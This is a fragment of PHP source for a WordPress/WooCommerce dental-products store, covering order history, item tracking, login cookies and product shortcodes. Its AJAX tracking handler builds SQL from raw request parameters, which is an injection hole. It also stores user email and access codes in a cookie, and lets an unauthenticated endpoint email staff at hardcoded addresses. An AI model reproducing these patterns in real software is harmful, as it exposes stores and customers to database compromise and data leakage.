                <div class="flex-divParent hidden-mobile">
                    <div class="dateDisplay ">
                        <div class="flex-div font-mont">
                            <span class="dateOption">Date:</span>
                            <span class="dateDigits text-blue"><?php echo esc_html(wc_format_datetime($order->get_date_created())); ?></span>
                        </div>
                    </div>
                    <div class="orderStatus hidden-mobile">
                        <div class="flex-div font-mont">
                            <span class="dateOption">Status:</span>
                            <span class="statusOptionDisplay text-blue"><?php echo ucwords(wc_get_order_status_name($order->get_status())); ?></span>
                        </div>
                    </div>
                    <div class="totalAmount hidden-mobile">
                        <div class="flex-div font-mont">
                            <span class="dateOption ">Total:</span>
                            <span class="text-blue priceDispaly">
                                <?php echo $order->get_formatted_order_total(); ?>
                            </span>
                        </div>
                    </div>

                    <div class="actionOrderLevel">
                        <?php
$order_number = $order->get_id();

        $invoice = wc_pip()->get_document('invoice', array('order' => $order));

        if ($invoice && $invoice->has_invoice_number()) {

            $invoiceLink = wp_nonce_url(
                add_query_arg([
                    'wc_pip_action' => 'print',
                    'wc_pip_document' => 'invoice',
                    'order_id' => $order->get_id(),
                ]),
                'wc_pip_document'
            );
            ?>
                            <a target="_blank" href="<?php echo site_url($invoiceLink); ?>" class="text-blue">Invoice</a>
                        <?php
}

        if ($order->get_status() == 'pending' || $order->get_status() == 'failed') {
            ?>
                            <a href="<?php echo $order->get_checkout_payment_url(); ?>" class="text-blue orangeButton">Pay Now</a>
                        <?php
} else if ($order->get_status() == 'processing') {
            echo cancelOrderButton($order_number);
        } else {
            if (in_array($order->get_status(), array('partial_ship', 'shipped'))) {

                $query = "SELECT  st.easyPostShipmentTrackingUrl FROM " . SB_EASYPOST_TABLE . " as st";
                $query .= " JOIN " . SB_SHIPMENT_ORDERS_TABLE . " as l ON l.shipment_id=st.shipment_id";
                $query .= " WHERE  l.order_id = $order_number AND st.shipmentState IS  NULL";
                $query .= " ORDER BY st.shipment_id DESC ";
                $query_tracking_number = $wpdb->get_var($query);
                if ($query_tracking_number) {
                    echo '</span><a href="' . $query_tracking_number . '" target="_blank" class="text-blue">Track <span class="hidden-mobile">Order</span></a>';
                    echo refundOrderButton($order_number, $order->get_order_number());
                }
            } else {
                //
            }
        }
        ?>
                    </div>
                </div>
            </div>
            <div class="mobileStrip hiddenDesktop">
                <div class="rowFlex">
                    <div class="dateDisplay">
                        <div class="flex-div font-mont">
                            <span class="dateOption">Date:</span>
                            <span class="dateDigits text-blue"><?php echo esc_html(wc_format_datetime($order->get_date_created())); ?></span>
                        </div>
                    </div>
                    <span class="sepratorPipe"></span>
                    <div class="orderStatus">
                        <div class="flex-div font-mont">
                            <span class="dateOption">Status:</span>
                            <span class="statusOptionDisplay text-blue"><?php echo ucwords(wc_get_order_status_name($order->get_status())); ?></span>
                        </div>
                    </div>
                </div>

            </div>


            <div class="lowOrderArea">
                <?php
//continue;

        foreach ($order->get_items() as $item_id => $item) {

            if (wc_cp_get_composited_order_item_container($item, $order)) {
                continue;
            } else {
                $product_id = $item->get_product_id();
                $three_way_ship_product = get_post_meta($product_id, 'three_way_ship_product', true);
                $product = $item->get_product();
                $get_quantity = $item->get_quantity();
                $image = $product->get_image();
                $classSplited = '';
                $statusTitle = 'Preparation';
                $total = number_format((float) $item->get_total(), 2, '.', '');
                //$total = $item->get_total();
                $shippedhistory = 0;
                $get_statusItem = 1;
                if ($order->get_status() === 'processing') {
                    $get_statusItem = 1;
                } else if (in_array($order->get_status(), array('partial_ship', 'shipped', 'completed', 'on-hold', 'refunded'))) {
                    $q1 = "SELECT e.status , l.event_id  FROM  " . SB_LOG . " as l";
                    //  $q1 = "SELECT l.event_id   FROM  " . SB_LOG . " as l";
                    $q1 .= " JOIN " . SB_EVENT . " as e ON l.event_id=e.event_id";
                    $q1 .= " WHERE item_id = " . $item_id . " AND product_id = " . $product_id;
                    $q1 .= " ORDER BY log_id DESC LIMIT 1";
                    //$get_statusItem = $wpdb->get_var($q1);
                    $logEntry = $wpdb->get_row($q1, 'ARRAY_A');
                    // echo '<pre>';
                    // print_r($logEntry);
                    // echo '</pre>';
                    if (isset($logEntry['event_id']) && $logEntry['event_id'] > 0) {
                        $get_statusItem = $logEntry['event_id'];
                        $statusTitle = $logEntry['status'];
                    }
                    if ($get_statusItem == 17) {
                        $classSplited = 'itemSplitted';
                    }
                    if (isset($logEntry['event_id']) && $logEntry['event_id'] == 2) {
                        $shippedhistory = wc_get_order_item_meta($item_id, '_shipped_count', true);
                    }
                } else {
                    $get_statusItem = 0;
                }
                $itemData = $wpdb->get_row("SELECT tray_number , created_date FROM  " . SB_ORDER_TABLE . " WHERE item_id = $item_id");
                $tray_number = isset($itemData->tray_number) ? $itemData->tray_number : '';
                // var_dump($get_statusItem);
                // subscription#RB
                $subscription_order = $wpdb->get_row("SELECT * FROM sbr_subscription_details WHERE order_id = " . $customer_order . " AND item_id = " . $item_id . " AND subscription_id > 0 ORDER BY id DESC LIMIT 0,1");
                //$productTitle = '<h4 class="productNameAndQuantity mb-0 ' . $classSplited . '"><a href="' . get_the_permalink($product_id) . '" target= "_blank">' . (in_array($product_id, [SHINE_PERK_PRODUCT_ID, SHINE_COMPLETE_PRODUCT_ID, SHINE_DENTAL_PRODUCT_ID])? $item->get_name().' <small>('.ucfirst(wc_get_order_item_meta($item_id, '_shine_members', true)).')</small>' : $item->get_name()) . '</a> × <span class="text-blue">' . $get_quantity . ($subscription_order->status ? "x <small>Subscribed</small>" : "") . '</span></h4>';
             //   $productTitle = '<h4 class="productNameAndQuantity mb-0 ' . $classSplited . '"><a href="' . get_the_permalink($product_id) . '" target="_blank">' . (in_array($product_id, [SHINE_PERK_PRODUCT_ID, SHINE_COMPLETE_PRODUCT_ID, SHINE_DENTAL_PRODUCT_ID]) ? $item->get_name().' <small>('.ucfirst(wc_get_order_item_meta($item_id, '_shine_members', true)).')</small>' : $item->get_name()) . '</a> × <span class="text-blue">' . $get_quantity . (!empty($subscription_order) && $subscription_order->status ? "x <small>Subscribed</small>" : "") . '</span></h4>';
             $productTitle = '<h4 class="productNameAndQuantity mb-0 ' . $classSplited . '">
    <a href="' . get_the_permalink($product_id) . '" target="_blank">' . 
    (in_array($product_id, [SHINE_PERK_PRODUCT_ID, SHINE_COMPLETE_PRODUCT_ID, SHINE_DENTAL_PRODUCT_ID]) ? 
    $item->get_name() . ' <small>(' . ucfirst(wc_get_order_item_meta($item_id, '_shine_members', true)) . ')</small>' : 
    $item->get_name()) . 
    '</a> × <span class="text-blue">' . $get_quantity . 
    (!empty($subscription_order) && !is_null($subscription_order->status) && $subscription_order->status ? " x <small>Subscribed</small>" : "") . 
    '</span></h4>';
  
             $strcls = 'parent-';
                if(order_contains_product($order->get_items(),$arr_ng_reorders)){
                    $strcls = 'child-';
                }
                $strcls .=$tray_number;
                
                ?>

                        <div class="sbr-orderItem flex-div <?php echo $strcls;?>">
                            <div class="sbr-orderItemLeft">
                                <div class="orderImage">
                                    <?php echo wp_kses_post(apply_filters('woocommerce_order_item_thumbnail', $image, $item)); ?>
                                </div>
                                <div class="orderTitle">
                                    <?php echo $productTitle;
                ?>
                                    <div class="orderItemSubtotal">
                                        <span class="titlePrice">Price: </span>
                                        <span class="price">
                                            $<?php echo $total; ?>
                                        </span>
                                        
                                    </div>
                                    <? if($tray_number!=''){?>
                                    <div class="orderItemSubtotal">
                                        <span class="titlePrice">Tray Number: </span>
                                        <span class="price">
                                            <?php echo  $tray_number; ?>
                                        </span>
                                      
                                    </div>
                                    <? }?>

                                </div>

                            </div>
                            <?php if ($product_id != SHIPPING_PROTECTION_PRODUCT) {?>
                            <div class="sbr-orderItemRight">
                                <div class="sbr-orderItemRightActions">
                                    <?php
                    ?>

                                    <?php
if ($three_way_ship_product == 'yes') {
                        // echo getReorderKitButton($product_id,$item_id);
                        echo getReorderKitButton($product_id, $item_id, $order->get_status());
                        /*
                    if (in_array($order->get_status(), array('shipped','completed'))) {
                    echo getReorderKitButton($product_id, $item_id);
                    }
                     */
                    } else {
                        if (get_field('buy_again', $product_id) == 'hide') {
                            $order_item_meta = $wpdb->get_results( 
                                $wpdb->prepare("
                                    SELECT meta_key, meta_value
                                    FROM {$wpdb->prefix}woocommerce_order_itemmeta
                                    WHERE order_item_id = %d AND meta_key='_line_subtotal'
                                ", $item_id) 
                            );
                           $pp = isset($order_item_meta[0]->meta_value) ? $order_item_meta[0]->meta_value:get_post_meta(get_the_id(),'_price',true);
                           
                                   if(in_array($product_id,$arr_ng_reorders)){
                                  
                                   
                                    if($tray_number !='' && !in_array($product->get_id(), [SHINE_PERK_PRODUCT_ID, SHINE_COMPLETE_PRODUCT_ID, SHINE_DENTAL_PRODUCT_ID])){
                                      //  echo $re_order_parent_product_id;
                                      //  echo getReorderKitButtonPreviousVersion($re_order_parent_product_id,$item_id);
                                        ?>
                                            <button class="btn btn-primary-blue btn-lg product_type_simple" onClick="goToReorderParent(<?php echo $tray_number;?>,<?php echo $product->get_id(); ?>)" href="javascript:void(0);" data-quantity="<?php echo $item->get_quantity(); ?>"data-2_nightguards_package="<?php echo $pp;?>" data-product_id="<?php echo $product->get_id(); ?>" data-tray_number="<?php echo $tray_number ?>" data-action="woocommerce_add_order_item">Buy Again</button>
                                        <?php
                                        //break;
                                    }
                                   
                                }
                               
                             else {
                               // echo 'No products found.';
                            }
                            
                            //$item_meta = wc_get_order_item_meta($item_id);
                            
                        }
                        if (get_field('buy_again', $product_id) != 'hide' && (!empty($subscription_order) && !$subscription_order->status) && !in_array($product->get_id(), [SHINE_PERK_PRODUCT_ID, SHINE_COMPLETE_PRODUCT_ID, SHINE_DENTAL_PRODUCT_ID])) {                            ?>
                                            <button class="btn btn-primary-blue btn-lg product_type_simple add_to_cart_button ajax_add_to_cart" href="?add-to-cart=<?php echo $product->get_id(); ?>" data-quantity="<?php echo $item->get_quantity(); ?>" data-product_id="<?php echo $product->get_id(); ?>" data-action="woocommerce_add_order_item">Buy Again</button>
                                    <?php
}
                    }

                    ?>

                                </div>


                                <?php
//'completed', 'on-hold', 'refunded',
                    if (in_array($order->get_status(), array('partial_ship', 'shipped', 'processing'))) {?>
                                    <div class="sbr-orderItemRightStatus">
                                        <?php
$itemData = array(
                        'product_id' => $product_id,
                        'item_id' => $item_id,
                        'order_number' => $order->get_order_number(),
                        'shipped' => $shippedhistory,
                    );
                        echo stageItemLevel($get_statusItem, $three_way_ship_product, $statusTitle, $itemData);
                        echo '<div class="trackOrderReview">';
                        echo '<a href="javascript:;" data-toggle="modal" data-target="#viewLogModalpopup" onclick="viewItemSummery(' . $product_id . ' , ' . $item_id . ' , \'' . $order->get_order_number() . '\')" class="viewlogbtn  mobileTrackButton order3" data-toggle="modal" data-target="#exampleModal">Track</a>';
                        echo '<a href="javascript:;" data-toggle="modal" data-target="#addProductModalpopup" onclick="addProductReview(' . $product_id . ' , ' . $item_id . ' , \'' . $order->get_order_number() . '\')" class="viewlogbtn  mobileTrackButton order3 buttonBlue" data-toggle="modal" data-target="#addCustomerProductReview">Add a review</a>';
                        echo '</div>';
                        ?>
                                    </div>
                                <?php }?>
                            </div>
                            <?php }?>
                        </div>
                <?php
}
        }
        ?>
            </div>
        </div>
<?php
}
    if (isset($_REQUEST['action'])) {
        die;
    } else {
        return true;
    }
}
    function stageItemLevel($event_id, $type = 0, $statusTitle = '', $data = array())
    {
        // echo 'event_id= ' . $event_id;

        $stage = array(
            1, 2, 3, 5, 6, 7, 8, 16
        );
        $html = '';
        if (in_array($event_id, $stage)) {

            if ($type == 'yes') {
                $printCount = 7;
                $filled = array_search($event_id, $stage);
            } else {
                $printCount = 1;
                $filled = array_search($event_id, $stage);
            }
            if ($event_id == 16) {
                $filled = 6;
            }
            if (in_array($event_id, array(7, 8))) {
                $filled = 4;
            }
            if (isset($data['shipped']) && $data['shipped'] == 2) {
                $filled = 7;
            }
            //echo 'printCount= ' . $printCount;
            //echo 'filled= ' . $filled;
            $html .= '<div class="stagelevel">';
            $html .= '<div class="progressTitileText">Progress:';
            $html .= '</div>';
            for ($i = 0; $i <= $printCount; $i++) {
                if ($i <= $filled) {
                    $html .= '<span class="fill"></span>';
                } else {
                    $html .= '<span class="blank"></span>';
                }
            }
            $html .= '</div>';
        }
        $html .= '<div class="statusTitleParentFlex setMinWidth">';
        if ($statusTitle) {
            $html .= '<div class="statusTitle  font-mont"><span class="dateOption">Status:</span> <span class="statusTextclr text-blue">';
            $html .= $statusTitle;
            $html .= '</span></div>';
        }
        if (isset($data['item_id'])) {

            $html .= '<a href="javascript:;" data-toggle="modal" data-target="#viewLogModalpopup" onclick="(' . $data['product_id'] . ' , ' . $data['item_id'] . ' , \'' . $data['order_number'] . '\')" class="viewlogbtn hidden" data-toggle="modal" data-target="#exampleModal">Track</a>';
        }

        $html .= '</div>';

        return $html;
    }

    add_action('wp_ajax_viewItemSummery', 'viewItemSummery_callback');

    function viewItemSummery_callback()
    {
        global $wpdb;
        $item_id = $_REQUEST['item_id'];
        $product_id = $_REQUEST['product_id'];
        $image = wp_get_attachment_image_src(get_post_thumbnail_id($product_id), 'thumbnail');
        $q_last = "SELECT *  FROM  " . SB_LOG . ' as l';
        $q_last .= " JOIN " . SB_EVENT . " as e ON l.event_id=e.event_id";
        $q_last .= " WHERE item_id = " . $item_id . " AND product_id = " . $product_id;
        $q_last .= " ORDER BY log_id ASC";
        $query_last = $wpdb->get_results($q_last);
        // echo '<pre>';
        // print_r($query_last);
        // echo '</pre>';
        $html = '';
        $html .= '<div class="d-flex align-items-center">';
        $html .= '<div class="viewLogProductThumb">';
        if (isset($image[0])) {
            $html .= '<img src="' . $image[0] . '" alt="" class="img-fluid">';
        }

        $html .= '</div>';
        $html .= '<div class="viewLogProductTitle font-mont">';
        $html .= get_the_title($product_id);
        $html .= '</div>';
        $html .= '</div>';
        $html .= '<div class="viewLogListDetail">';
        $html .= '<ul>';
        if ($query_last) {

            foreach ($query_last as $key => $value) {
                $html .= '<li class="' . $value->event_id . '">';
                // $html .= '<li>';
                if (end((array_keys($query_last))) == $key) {
                    $html .= '<div class="d-flex shipmentCompletedRow align-items-center">';
                } else {
                    $html .= '<div class="d-flex align-items-center">';
                }

                $html .= '<div class="dateCircleParent">';
                $html .= '<div class="dateCircle">';
                $html .= '<span class="dateNumber">' . date('d', strtotime($value->created_date)) . '</span>';
                $html .= '<span class="dateMonth">' . date('M', strtotime($value->created_date)) . '</span>';
                $html .= '</div>';
                $html .= '</div>';
                $html .= '<div class="viewLogStatus">';
                if ($value->event_id == 5) {
                    $impressionNotes = '';
                    if (trim($value->note) != '') {
                        if ($value->extra_information == '00') {
                            $impressionNotes .= '<span"> - Both impressions bad</span>';
                        } else if ($value->extra_information == '01') {
                            $impressionNotes .= '<span> - Upper impression bad</span><br/>';
                            $impressionNotes .= '<span> - Lower impression good</span>';
                        } else if ($value->extra_information == '10') {
                            $impressionNotes .= '<span> - Upper impression good</span><br/>';
                            $impressionNotes .= '<span> - Lower impression bad</span>';
                        } else if ($value->extra_information == '11') {
                            $impressionNotes .= '<span> - Both impressions good</span>';
                        } else if ($value->extra_information == '4') {
                            $impressionNotes .= '<span> - Impression good</span>';
                        } else if ($value->extra_information == '3') {
                            $impressionNotes .= '<span> - Impression bad</span>';
                        }
                        $html .= '<span class="logItemStatus">' . $value->status . '</span><span class="impressionNotes">' . $impressionNotes . '</span>';
                    } else {
                        $html .= '<span class="logItemStatus">' . $value->status . '</span>';
                    }
                } else if ($value->event_id == 7 && $value->child_order_id > 0) {

                    $notedAddon = ' - Addon order created.<br/> - Order number ' . get_post_meta($value->child_order_id, 'order_number', true);
                    $html .= '<span class="logItemStatus">' . $value->status . '</span><span class="addOnOrderNote">' . $notedAddon . '</span>';
                } else if ($value->event_id == 6) {
                    $html .= '<span class="logItemStatus">' . $value->event_description . '</span>';
                } else if ($value->event_id == 16) {
                    $html .= '<span class="logItemStatus">' . $value->event_name . '</span>';
                } else if ($value->event_id == 17) {
                    $username = get_post_meta($value->child_order_id, '_billing_first_name', true) . ' ' . get_post_meta($value->child_order_id, '_billing_last_name', true);
                    $html .= '<span class="logItemStatus">This item has been re-assigned to ' . $username . '</span>';
                } else {
                    $html .= '<span class="logItemStatus">' . $value->status . '</span>';
                }
                if ($value->event_id == 2) {
                    $htmlTracking = '';
                    if ($value->shipment_id > 0) {
                        $htmlTracking .= '<br/><span class="logItemMeta"> - Tracking Code: ';
                        $shipmentDetail = $wpdb->get_row("SELECT easyPostShipmentTrackingUrl , trackingCode , shipmentStatus FROM " . SB_EASYPOST_TABLE . " WHERE shipment_id=" . $value->shipment_id);
                        $easyPostShipmentTrackingUrl = $shipmentDetail->easyPostShipmentTrackingUrl;
                        $trackingCode = $shipmentDetail->trackingCode;
                        $shipmentStatus = $shipmentDetail->shipmentStatus;
                        $link = 'javascript:;';
                        if ($easyPostShipmentTrackingUrl) {
                            $link = $easyPostShipmentTrackingUrl;
                        }
                        $status = 'delivered';
                        if ($shipmentStatus) {
                            $status = $shipmentStatus;
                        }
                        $status = ucwords(str_replace("_", " ", $status));
                        $htmlTracking .= '<a href="' . $link . '" target="_blank">' . $trackingCode . '</a> (' . $status . ')';
                        $htmlTracking .= '</span>';
                    }

                    $html .= $htmlTracking;
                }
                $html .= '</div>';
                $html .= '</div>';
                $html .= '</li>';
            }
        }


        $html .= '</ul>';
        $html .= '</div>';
        echo $html;
        die;
    }

    add_action('wp_login', 'set_extra_login_cookie_mbt', 10, 2);

    function set_extra_login_cookie_mbt($user_login, $user)
    {
        global $wpdb;
        if (isset($_POST['login']) && isset($_POST['woocommerce-login-nonce']) && isset($_POST['_wp_http_referer'])) {
            setcookie('logged_in_user_mbt', $user->ID, time() + 24 * 3600, COOKIEPATH, COOKIE_DOMAIN);
            // Assuming $user is already defined and is an instance of the WP_User class

// Retrieve user meta for the access code
$access_code = get_user_meta($user->ID, 'access_code', true);

// Check if access code exists

    // Retrieve user details
    $first_name = get_user_meta($user->ID, 'first_name', true);
    $last_name = get_user_meta($user->ID, 'last_name', true);
    $email = $user->user_email;

    // Prepare cookie data as a pipe-separated string
    $cookie_value = $user->ID . '|' . $email . '|' . $first_name . '|' . $last_name . '|' . $access_code;

    // Set the cookie with a 24-hour expiration
    setcookie('logged_in_user_mbt_darkstar', $cookie_value, time() + 24 * 3600, COOKIEPATH, COOKIE_DOMAIN);
    if (get_user_meta($user->ID, 'geha_user', true) == 'yes') {
        setcookie('geha_user', 'yes', time() + (3600 * 24 * 360), '/');
    }
   
    if (get_user_meta($user->ID, 'access_code', true) != '') {
        setcookie('access_code', 'yes', time() + (3600 * 24 * 360), '/');
    }
    
//}

        }
    }

    add_action('wp_logout', 'del_extra_logout_cookie_mbt');

    function del_extra_logout_cookie_mbt()
    {
        setcookie('logged_in_user_mbt', '---', time() - 3600, COOKIEPATH, COOKIE_DOMAIN);
        setcookie('logged_in_user_mbt_darkstar', '---', time() - 3600, COOKIEPATH, COOKIE_DOMAIN);
    }
    add_filter('woocommerce_cart_item_class', 'additional_class_to_cart_item_classes_mbt', 10, 3);
    function additional_class_to_cart_item_classes_mbt($class, $cart_item, $cart_item_key)
    {
        if (isset($cart_item['free_probiotics'])) {
            $class .= ' free_probiotics';
        }

        return $class;
    }
    add_action('init', '_custom_geha_reports_mbt');
    function _custom_geha_reports_mbt()
    {
        global $wpdb;
        $gehaorders = array();
        $customers_count = array();
        if (isset($_GET['ctgr'])) {

            $sql = "SELECT meta_value FROM wp_postmeta WHERE meta_key = '_customer_user' AND post_id IN (SELECT DISTINCT order_id FROM wp_woocommerce_order_items 
            INNER JOIN wp_posts ON wp_woocommerce_order_items.order_id = wp_posts.id 
            INNER JOIN wp_postmeta ON wp_posts.ID = wp_postmeta.post_id 
            WHERE (order_item_name LIKE '%GEHA%' || order_item_name LIKE 'GE%') 
            AND wp_posts.`post_date` BETWEEN '2012-01-01' AND '2022-08-02' AND wp_posts.`post_status` !='wc-refunded'  
            AND wp_postmeta.meta_key ='_order_total' AND wp_postmeta.meta_value >0)";
            $result3 = $wpdb->get_results($sql, 'ARRAY_A');
            foreach ($result3 as $ord) {
                $meta_val = $ord['meta_value'];
                if (isset($customers_count[$meta_val])) {
                    $customers_count[$meta_val] = $customers_count[$meta_val] + 1;
                } else {
                    $customers_count[$meta_val] = 1;
                }
            }
            echo count($customers_count);
            echo '<pre>';
            arsort($customers_count);
            print_r(array_count_values($customers_count));
            die();
        }
    }
    add_filter('wc_authorize_net_cim_credit_card_payment_form_payment_method_html', 'modify_paymentprofile_data_hsa_fsa', 10, 3);

    function modify_paymentprofile_data_hsa_fsa($html_original, $token, $obj)
    {
        global $wpdb;
        $tbl = $wpdb->prefix . 'woocommerce_payment_tokens';
        $tbl2 = $wpdb->prefix . 'woocommerce_payment_tokenmeta';
        $sqlQuery = " select meta_value from " . $tbl2 . " as t2 inner join " . $tbl . " as t1 on t1.token_id=t2.payment_token_id WHERE t1.token =" . $token->get_id() . " AND t2.meta_key='hsa_fsa'";
        $token_meta_val = $wpdb->get_var($sqlQuery);
        $html_str = '';
        if ($token_meta_val == 'yes') {
            $html_str = '<div class="hsa_fsa_true"></div>';
            $html_original = str_replace('type="radio"', 'type="radio" data-hsa_fsa="true"', $html_original);
            $html_original  = preg_replace("/<img[^>]+\>/i", "", $html_original);
            $html_original = str_replace('<span class="title">', '<span class="title"><span class="hsa_fsa_true"></span>', $html_original);
            //  $html_original = str_replace('<label class="sv-wc-payment-gateway-payment-form-saved-payment-method"', '<div class="mbt-title-payment"><label class="sv-wc-payment-gateway-payment-form-saved-payment-method"', $html_original);

        }
        $html_original = str_replace('<input type="radio"', '<div class="input-parent-mbt"><input type="radio"', $html_original);
        $html_original = str_replace(')</span></label>', ')</span></label></div>', $html_original);
        return $html_original;
    }
    add_filter('wc_authorize_net_cim_my_payment_methods_table_method_title', 'dashboard_account_my_payment_methods_table_method_title', 10, 3);
    function dashboard_account_my_payment_methods_table_method_title($title, $token, $obj)
    {
        if (empty($token->get_nickname())) {
            global $wpdb;
            $hsa_fsa = $wpdb->get_var("SELECT  meta_value FROM {$wpdb->prefix}woocommerce_payment_tokens token inner join {$wpdb->prefix}woocommerce_payment_tokenmeta tokenmeta on token.token_id=tokenmeta.payment_token_id  WHERE token.token = " . esc_attr($token->get_id()) . " AND tokenmeta.meta_key = 'hsa_fsa'");
            if ($hsa_fsa == 'yes') {
                $title = 'HSA/FSA';
            }
        }
        return $title;
    }
    add_action('wp_ajax_senderror_email_to_admin', 'senderror_email_to_admin');
    add_action('wp_ajax_nopriv_senderror_email_to_admin', 'senderror_email_to_admin');
    function senderror_email_to_admin($mes = '')
    {
        $error_m = isset($_REQUEST['error_m']) ? $_REQUEST['error_m'] : '';
        if ($error_m == '') {
            $error_m = $mes;
        }
        if ($error_m != '') {
            $group_emails = array('abidoon@mindblazetech.com', 'kamran@mindblazetech.com', 'amir.shah@agilitycollective.com', 'mike@smilebrilliant.com');
            //$to = 'abidoon@mindblazetech.com';
            $subject = 'Add to cart failure';
            $body = $error_m;
            $headers = array('Content-Type: text/html; charset=UTF-8',);
            wp_mail($group_emails, $subject, $body, $headers);
        }
    }
    add_filter('woocommerce_add_to_cart_validation', 'avoid_add_to_cart_conditionally_mbt', 20, 3);
    function avoid_add_to_cart_conditionally_mbt($passed, $product_id, $quantity)
    {
        $_product = wc_get_product($product_id);
        if (!$_product->is_purchasable()) {
            $message = get_the_title($product_id) . ' is not purchasable';
            senderror_email_to_admin($message);
        }
        $component_data = get_post_meta($product_id, '_bto_data', true);
        if (is_array($component_data) && count($component_data) > 0) {
            foreach ($component_data as $key => $comp) {
                $component_id = isset($comp['default_id']) ? $comp['default_id'] : '';
                if ($component_id != '') {
                    $_product = wc_get_product($component_id);
                    if (!$_product->is_purchasable()) {
                        $message = 'The component ' . get_the_title($component_id) . ' is not purchasable';
                        senderror_email_to_admin($message);
                    }
                }
            }
        }

        return $passed;
    }
    add_action('init', 'vc_custom_params_rdhc');
    function vc_custom_params_rdhc()
    {
        if(!function_exists('vc_add_param')){
            return false;
        }
        $optionss = array();
        $args = array(
            'post_type' => 'product',
            'posts_per_page' => -1,
            'order' => 'ASC',
            'orderby' => 'title',
            'fields' => 'ids',
            'tax_query' => array(
                array(
                    'taxonomy' => 'product_cat',
                    'field' => 'slug',
                    'terms' => array('raw', 'packaging', 'landing-page', 'uncategorized', 'data-only', 'addon'),
                    'operator' => 'NOT IN',
                ),
            ),
        );

        $product_list = get_posts($args);
        foreach ($product_list as $prod_id) {
            $options[get_the_title($prod_id)] = $prod_id;
        }
        $taxonomies_ptypes = get_terms(array(
            'taxonomy' => 'type',
            'hide_empty' => false
        ));
        if (!empty($taxonomies_ptypes)) {

            foreach ($taxonomies_ptypes as $category) {
                $options[$category->name . ' (Category)'] = $category->slug;
            }
        }

        $attribute_content = array(
            'type' => 'textarea_html',
            'heading' => "Content",
            'param_name' => 'content',
            'description' => __("Full width product description", "my-text-domain"),
        );
        vc_add_param('single_porudct_rdhc', $attribute_content);
        $attributes = array(
            'type' => 'dropdown',
            'heading' => "Product Or Category",
            'param_name' => 'product_id',
            'value' => $options,
            'description' => __("Please select the product/category you want to add ", "my-text-domain"),
        );
        vc_add_param('single_porudct_rdhc', $attributes); // Note: 'vc_message' was used as a base for "Message box" element

        $image_1 = array(
            "type" => "attach_image",
            'heading' => "Custom Image",
            'param_name' => 'custom_image',
            'description' => __("Please upload custom image This will replace default image ", "my-text-domain"),
        );
        vc_add_param('single_porudct_rdhc', $image_1);
    }
    add_action('init', 'vc_custom_params');
    function vc_custom_params()
    {
        if(!function_exists('vc_add_param')){
            return false;
        }
        $args = array(
            'post_type' => 'product',
            'posts_per_page' => -1,
            'fields' => 'ids',
            'tax_query' => array(
                array(
                    'taxonomy' => 'product_cat',
                    'field' => 'slug',
                    'terms' => array('raw', 'packaging', 'landing-page', 'uncategorized', 'data-only', 'addon'),
                    'operator' => 'NOT IN',
                ),
            ),
        );

        $product_list = get_posts($args);
        foreach ($product_list as $prod_id) {
            $options[get_the_title($prod_id)] = $prod_id;
        }
        $attributes = array(
            'type' => 'dropdown',
            'heading' => "Product Id",
            'param_name' => 'product_id',
            'value' => $options,
            'description' => __("Please select the product you want to add ", "my-text-domain"),
        );
        vc_add_param('single_porudct_landing', $attributes); // Note: 'vc_message' was used as a base for "Message box" element
        $image_1 = array(
            "type" => "attach_image",
            'heading' => "Custom Image",
            'param_name' => 'custom_image',
            'description' => __("Please upload custom image This will replace default image ", "my-text-domain"),
        );
        vc_add_param('single_porudct_landing', $image_1);
    }

    add_shortcode('single_porudct_landing', 'single_porudct_landing_callback');
    function single_porudct_landing_callback($atts)
    {

        extract(shortcode_atts(array(
            'product_id' => '',
            'custom_title' => '',
            'recommended' => '',
            'callout_text' => '',
            'custom_image' => '',
            'description' => '',
            'link_url' => '',
            'add_to_cart' => ''


        ), $atts));
        $ptitle = get_the_title($product_id);
        $post_date = get_the_date('Ymd', $product_id);
        $_product = wc_get_product((int) $product_id);
        if ($custom_title != '') {
            $ptitle = $custom_title;
        }
        $str = '';

        $featured_img_url = get_the_post_thumbnail_url($product_id, 'full');
        if ($custom_image != '') {
            $featured_img_url = wp_get_attachment_image_url($custom_image, 'full');
        }
        $rec = 0;
        $btn = ' <button class="btn btn-primary-blue product_type_composite add_to_cart_button ajax_add_to_cart" href="?add-to-cart=' . $product_id . '" data-quantity="1" data-product_id="' . $product_id . '" data-action="woocommerce_add_order_item">ADD TO CART</button>';
        if ($add_to_cart == 'no') {
            $btn = ' <a class="btn btn-primary-blue product_type_composite" href="' . $link_url . '" data-quantity="1" > Select a package</a>';
        }
        if ($recommended == 'yes') {
            $rec = 1;
        }
        if ($_product && $_product->is_on_sale()) {
            //$callout_text = 'Sale!';
            $str = '<span class="wasText">was </span><del aria-hidden="true"><span class="woocommerce-Price-amount amount"><bdi><span class="woocommerce-Price-currencySymbol">$</span>' . $_product->get_regular_price() . '</bdi></span></del>';
        } else {
            if (strpos($callout_text, 'Sale') !== false) {
                $callout_text = '';
            }
        }
        $data = '<div class="lander-shortcode" data-price="' . $_product->get_price() . '" data-date="' . $post_date . '" data-recommended="' . $rec . '" data-tagging="' . $callout_text . '">
                    <div class="product-selection-box">';
        if ($callout_text != 'Select') {
            $data .= '<div class="featureTag"><span>' . $callout_text . '</span></div>';
        }

        $data .= '<div class="product-selection-image-wrap">
                        <a href="' . $link_url . '">
                            <img src="' . $featured_img_url . '">
                        </a>
                        </div>
                        <div class="product-selection-description-parent">
                            <div class="product-selection-description-parent-inner">
                                <div class="product-selection-description">
                                    <div class="productDescriptionDiv"> <b>' . $ptitle . '</b></div>
                                    <div class="productDescriptionFull">' . $description . '</div>
                                        <div class="product-selection-price-text-top">
                                            <span class="product-selection-price-text">' . $str . '
                                                <ins>
                                                    <span class="woocommerce-Price-amount amount">
                                                        <bdi><span class="woocommerce-Price-currencySymbol">$</span>' . $_product->get_price() . '</bdi>
                                                    </span>
                                                </ins>
                                            </span>
                                        </div>
                                    </div>
                                <div class="product-selection-price-wrap">               
                                ' . $btn . '
                                </div>
                            </div>
                        </div>
                    </div>
             </div>';
        return $data;
    }

    /*
 * Function for post duplication. Dups appear as drafts. User is redirected to the edit screen
 */
    function rd_duplicate_post_as_draft()
    {
        global $wpdb;
        if (!(isset($_GET['post']) || isset($_POST['post'])  || (isset($_REQUEST['action']) && 'rd_duplicate_post_as_draft' == $_REQUEST['action']))) {
            wp_die('No post to duplicate has been supplied!');
        }

        /*
     * Nonce verification
     */
        if (!isset($_GET['duplicate_nonce']) || !wp_verify_nonce($_GET['duplicate_nonce'], basename(__FILE__)))
            return;

        /*
     * get the original post id
     */
        $post_id = (isset($_GET['post']) ? absint($_GET['post']) : absint($_POST['post']));
        /*
     * and all the original post data then
     */
        $post = get_post($post_id);

        /*
